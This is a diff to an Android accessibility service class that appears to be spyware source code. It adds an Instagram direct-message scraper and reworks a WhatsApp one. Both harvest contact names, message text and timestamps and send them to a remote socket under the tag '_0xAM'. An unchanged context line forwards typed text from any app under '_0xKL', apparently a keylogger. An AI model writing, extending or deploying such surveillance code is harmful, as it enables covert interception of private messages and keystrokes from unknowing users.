@@ -15,17 +15,22 @@ import org.json.JSONArray;
 import org.json.JSONObject;
 
 import java.util.List;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 
 public class CustomAccessibilityService extends AccessibilityService {
 
     private long mDebugDepth;
     private String whatsAppConversationDate;
-    private CharSequence lastWhatsAppDate;
+    private String instagramConversationDate;
+    private String lastWhatsAppDate;
+    private Pattern timePattern;
 
 
-    private void getWhatsAppMessages(AccessibilityNodeInfoCompat rootInActiveWindow, AccessibilityEvent event) {
-        //rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/toolbar").get(0).mInfo.getParent().getChild(1).getChild(3)
+    private void getWhatsAppMessages(AccessibilityEvent event) {
+        AccessibilityNodeInfoCompat rootInActiveWindow = AccessibilityNodeInfoCompat.wrap(getRootInActiveWindow());
+
         List<AccessibilityNodeInfoCompat> nodeInfoByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.whatsapp:id/conversation_layout");
         if (nodeInfoByViewId == null || nodeInfoByViewId.size() <= 0)
             return;
@@ -43,7 +48,6 @@ public class CustomAccessibilityService extends AccessibilityService {
                 contactName = nodeInfoByViewId.get(0).getText();
             }
 
-            Boolean invalidateBeforeDate = false;
             JSONArray messages = new JSONArray();
             for (int i = 0; i < listNode.getChildCount(); i++) {
                 try {
@@ -64,6 +68,11 @@ public class CustomAccessibilityService extends AccessibilityService {
                             if (firstNodeChild.getViewIdResourceName().equals("com.whatsapp:id/conversation_row_date_divider")) {
                                 whatsAppConversationDate = firstNodeChild.getText().toString();
                                 lastWhatsAppDate = null;
+                                Matcher m = timePattern.matcher(whatsAppConversationDate);
+
+                                if (m.matches()) {
+                                    whatsAppConversationDate = "Today";
+                                }
 
                                 if (messages.length() > 0) {
                                     for (int ji = 0; ji < messages.length(); ji++) {
@@ -111,7 +120,7 @@ public class CustomAccessibilityService extends AccessibilityService {
                                 jsonMessage.put("isOwn", isSent);
                                 messages.put(jsonMessage);
 
-                                Log.i(isSent ? event.getEventType() + " - Mensagem Enviada " : "Mensagem Recebida", date + " - " + time + " - " + message);
+                              //  Log.i(isSent ? event.getEventType() + " - Mensagem Enviada " : "Mensagem Recebida", date + " - " + time + " - " + message);
                                 //todo send to backend!
                             }
                         } else if (firstNodeChild.getChildCount() > 1) {
@@ -125,6 +134,84 @@ public class CustomAccessibilityService extends AccessibilityService {
                 }
             }
             IOSocket.getInstance().send("_0xAM", messages.toString(), contactName, "WhatsApp");
+        }
+    }
+
+
+    private void getInstaMessages() {
+        AccessibilityNodeInfoCompat rootInActiveWindow = AccessibilityNodeInfoCompat.wrap(getRootInActiveWindow());
+
+        List<AccessibilityNodeInfoCompat> nodeInfoByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.instagram.android:id/message_list");
+        if (nodeInfoByViewId == null || nodeInfoByViewId.size() <= 0)
+            return;
+
+
+        AccessibilityNodeInfoCompat nodeInfo = nodeInfoByViewId.get(0);
+        if (nodeInfo.getChildCount() >= 1) {
+            //is a chat!
+            CharSequence contactName = null;
+            nodeInfoByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.instagram.android:id/thread_title");
+            if (nodeInfoByViewId.size() > 0) {
+                contactName = nodeInfoByViewId.get(0).getText();
+            }
+
+            JSONArray messages = new JSONArray();
+            for (int i = 0; i < nodeInfo.getChildCount(); i++) {
+                try {
+                    AccessibilityNodeInfoCompat chatNode = nodeInfo.getChild(i);
+                    if (chatNode == null)
+                        continue;
+
+                    if (chatNode.getClassName().equals("android.widget.TextView")) {
+                        instagramConversationDate = chatNode.getText().toString();
+                        for (int ji = 0; ji < messages.length(); ji++) {
+                            JSONObject msg = messages.getJSONObject(ji);
+                            if (msg.getString("date").equals(instagramConversationDate)) {
+                                messages.remove(ji);
+                            }
+                        }
+                        continue;
+                    }
+
+                    if (chatNode.getChildCount() <= 0)
+                        continue;
+
+                    if (chatNode.getChild(0).getViewIdResourceName().equals("com.instagram.android:id/user_avatar"))
+                        continue;
+
+                    if (instagramConversationDate != null) {
+                        boolean isSent = false;
+                        String message = null;
+                        String time = null;
+                        if (chatNode.getChildCount() == 2) {
+                            if (chatNode.getChild(1).getClassName().equals("android.widget.TextView")) {
+                                time = chatNode.getChild(1).getText().toString();
+                                message = chatNode.getChild(0).getChild(0).getChild(0).getChild(0).getText().toString();
+                            } else {
+                                isSent = true;
+                                time = chatNode.getChild(0).getText().toString();
+                                message = chatNode.getChild(1).getChild(0).getChild(0).getChild(0).getText().toString();
+                            }
+                        } else if (chatNode.getChildCount() == 3) {
+                            time = chatNode.getChild(2).getText().toString();
+                            message = chatNode.getChild(1).getChild(0).getChild(0).getChild(0).getText().toString();
+                        }
+
+                        if (message != null) {
+                            JSONObject jsonMessage = new JSONObject();
+                            jsonMessage.put("message", message);
+                            jsonMessage.put("date", instagramConversationDate);
+                            jsonMessage.put("time", time);
+                            jsonMessage.put("isOwn", isSent);
+                            messages.put(jsonMessage); }
+                    }
+
+                } catch (Exception ex) {
+                    ex.printStackTrace();
+                }
+            }
+
+            IOSocket.getInstance().send("_0xAM", messages.toString(), contactName, "Instagram");
         }
     }
 
@@ -147,26 +234,43 @@ public class CustomAccessibilityService extends AccessibilityService {
                     if (packageName.startsWith("com.whatsapp")) {
                         if (source.getViewIdResourceName() != null && source.getViewIdResourceName().equals("com.whatsapp:id/contact_row_container")) {
                             if (source.getChildCount() > 2) {
-                                lastWhatsAppDate = source.getChild(2).getChild(0).getChild(1).getText();
+                                lastWhatsAppDate = source.getChild(2).getChild(0).getChild(1).getText().toString();
                             } else if (source.getChildCount() > 1) {
-                                lastWhatsAppDate = source.getChild(1).getChild(0).getChild(1).getText();
+                                lastWhatsAppDate = source.getChild(1).getChild(0).getChild(1).getText().toString();
                             } else {
-                                lastWhatsAppDate = source.getChild(0).getChild(0).getChild(1).getText();
+                                lastWhatsAppDate = source.getChild(0).getChild(0).getChild(1).getText().toString();
+                            }
+                            if (lastWhatsAppDate != null) {
+                                if (lastWhatsAppDate.startsWith("Ativo") || lastWhatsAppDate.startsWith("Active")) {
+                                    lastWhatsAppDate = null;
+                                }
+                            }
+                        }
+                    } else if (packageName.startsWith("com.instagram")) {
+                        if (source.getViewIdResourceName() != null && source.getViewIdResourceName().equals("com.instagram.android:id/row_inbox_container")) {
+                            if (source.getChildCount() >= 2) {
+                                AccessibilityNodeInfo firstChild = source.getChild(1);
+                                if (firstChild != null && firstChild.getChildCount() >= 3) {
+                                    instagramConversationDate = firstChild.getChild(2).getText().toString();
+                                } else if (firstChild.getChildCount() == 2) {
+                                    instagramConversationDate = firstChild.getChild(1).getText().toString();
+                                }
                             }
                         }
                     }
+
                     break;
                 }
+
+                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
+                    if (packageName.startsWith("com.instagram"))
+                        getInstaMessages();
+                    break;
+
                 case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     if (packageName.startsWith("com.whatsapp")) {
-                        AccessibilityNodeInfoCompat rootInActiveWindow = AccessibilityNodeInfoCompat.wrap(getRootInActiveWindow());
-                        getWhatsAppMessages(rootInActiveWindow, event);
-                        printAllViews(source);
-
-                    } else if (packageName.startsWith("com.instagram"))
-                        printAllViews(source);
-                    else if (packageName.startsWith("com.facebook"))
-                        printAllViews(source);
+                        getWhatsAppMessages(event);
+                    }
                     break;
                 case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                     String msg = event.getText().toString();
@@ -185,9 +289,11 @@ public class CustomAccessibilityService extends AccessibilityService {
                     IOSocket.getInstance().send("_0xKL", eventText, appInfo == null ? packageName : pm.getApplicationLabel(appInfo));
                     break;
             }
-        } catch (Exception ex) {
+        } catch (
+                Exception ex) {
             ex.printStackTrace();
         }
+
     }
 
     private void printAllViews(AccessibilityNodeInfo mNodeInfo) {
@@ -233,6 +339,8 @@ public class CustomAccessibilityService extends AccessibilityService {
     @Override
     public void onServiceConnected() {
         //configure our Accessibility service
+        timePattern = Pattern.compile("[0-9]{2}:[0-9]{2}");
+
         AccessibilityServiceInfo info = getServiceInfo();
         this.setServiceInfo(info);
     }
